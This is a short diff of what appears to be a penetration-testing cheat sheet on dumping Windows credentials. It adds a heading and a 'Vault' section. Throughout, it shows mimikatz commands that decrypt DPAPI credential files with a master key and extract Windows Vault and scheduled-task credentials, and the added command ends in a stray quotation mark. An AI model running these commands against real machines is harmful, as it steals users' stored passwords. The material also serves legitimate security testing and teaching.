@@ -190,7 +190,7 @@ $ mimikatz !sekurlsa::dpapi
 $ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
 ```
 
-Task Scheduled credentials
+### Task Scheduled credentials
 
 ```powershell
 mimikatz(commandline) # vault::cred /patch
@@ -202,6 +202,12 @@ Persist    : 2 - local_machine
 Flags      : 00004004
 Credential : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 Attributes : 0
+```
+
+### Vault
+
+```powershell
+vault::cred /in:C:\Users\demo\AppData\Local\Microsoft\Vault\"
 ```
 
 
